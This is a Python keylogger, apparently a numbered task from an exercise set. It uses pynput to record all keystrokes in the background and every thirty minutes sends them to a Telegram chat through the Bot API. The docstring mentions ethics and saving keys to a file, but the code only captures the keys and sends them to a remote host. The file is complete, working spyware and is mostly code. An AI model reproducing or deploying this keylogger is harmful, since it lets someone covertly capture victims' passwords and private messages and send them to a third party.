# Task 04 : A simple keylogger
'''
Create a basic keylogger program
that records and logs keystrokes.
Focus on logging the keys pressed
and saving them to a file. Note:
Ethical considerations and
permissions are crucial for
projects involving keyloggers.
'''

import time as t
from pynput import keyboard 
import requests

# Telegram Bot Configuration
BOT_API_TOKEN = "Your bot token"  # Your bot token
USER_ID = "Your Telegram chat/user ID"  # Your Telegram chat/user ID
LOG_INTERVAL = 1800  # Log send interval in seconds (default: 30 minutes)

# Keystroke storage
keystrokes = []

# Function to send captured keystrokes to Telegram
def send_telegram_message(body):
    try:
        url = f"https://api.telegram.org/bot{BOT_API_TOKEN}/sendMessage"
        payload = {
            "chat_id": USER_ID,
            "text": body
        }
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Message sent successfully.")
        else:
            print(f"Failed to send message. Status Code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message: {e}")

# Key press event handler
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            keystrokes.append(key.char)  # Store regular characters
        else:
            keystrokes.append(f"[{str(key).replace('Key.', '')}]")  # Store special keys in brackets
    except:
        pass  # Ignore unprintable keys silently

# Listener runs in background
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Loop to send keystrokes every interval
while True:
    t.sleep(LOG_INTERVAL)
    if keystrokes:
        log_data = ''.join(keystrokes)
        send_telegram_message(log_data)
        keystrokes.clear()